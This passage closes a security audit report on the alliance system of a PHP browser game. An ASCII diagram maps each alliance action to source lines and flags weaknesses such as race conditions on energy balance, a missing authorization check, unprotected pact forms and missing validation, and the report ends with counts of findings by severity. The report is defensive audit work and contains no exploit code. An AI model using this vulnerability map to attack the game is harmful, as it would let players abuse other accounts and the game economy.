         |     Updates: alliances.duplicateur, alliances.energieAlliance
         |     RACE: TOCTOU on energy balance
         |
         +---> [Upgrade Research]    alliance.php:94-113 (NO auth check!)
         |     Updates: alliances.{tech}, alliances.energieAlliance
         |     RACE: TOCTOU on energy balance
         |
         +---> [Quit Alliance]      alliance.php:69-72
         |     Updates: autre.idalliance = 0
         |     MISSING: grade cleanup, chef check
         |
         +---> [Send Alliance Message] ecriremessage.php:12-19
               No rate limit

  [Alliance Admin]  (chef or graded member)
  allianceadmin.php
         |
         +---> [Change Name/Tag]     Lines 56-137  (chef only)
         |     NO tag format validation on change
         |     NO name format validation
         |
         +---> [Change Chef]         Lines 139-158 (chef only)
         |     Verifies target in alliance
         |
         +---> [Delete Alliance]     Lines 44-54   (chef only)
         |     Calls supprimerAlliance() -- transactional, comprehensive
         |
         +---> [Create/Delete Grade] Lines 74-119  (chef only)
         |     Can grade non-member players (!)
         |     Delete uses single hidden field for all rows (!)
         |
         +---> [Ban Member]          Lines 176-193 (bannir permission)
         |     Cleans up grades
         |     Does NOT prevent banning chef (!)
         |
         +---> [Invite Player]       Lines 299-326 (inviter permission)
         |     Checks player exists, not already invited
         |
         +---> [Declare/End War]     Lines 249-297 (guerre permission)
         |     Sends rapport to opponent chef
         |     Debug echo on line 258 (!)
         |
         +---> [Propose/Break Pact]  Lines 195-247 (pacte permission)
               Sends rapport with embedded HTML form (no CSRF!)

  [Pact Acceptance]
  validerpacte.php:2-26
  Checks: target alliance chef === session login
  CSRF protected
  Properly secured (fixed in earlier audit)

  [Alliance Deletion Triggers]
  1. Chef clicks "Supprimer" -> supprimerAlliance() -> immediate
  2. Chef quits -> alliance orphaned -> lazy delete on next page view
  3. Chef banned -> alliance orphaned -> lazy delete on next page view
  4. Chef account deleted -> alliance orphaned -> lazy delete on next page view

  supprimerAlliance() cleans:
    alliances, autre.idalliance, autre.energieDonnee,
    grades, invitations, declarations
  MISSING: stale rapport forms, pending war statistics
```

---

**End of Round 3 Alliance System Cross-Domain Audit**

Total findings: 10 new + 11 confirmed unfixed = 21 actionable items
Critical: 3 (all from rounds 1-2, still unfixed)
High: 7
Medium: 8
Low: 3
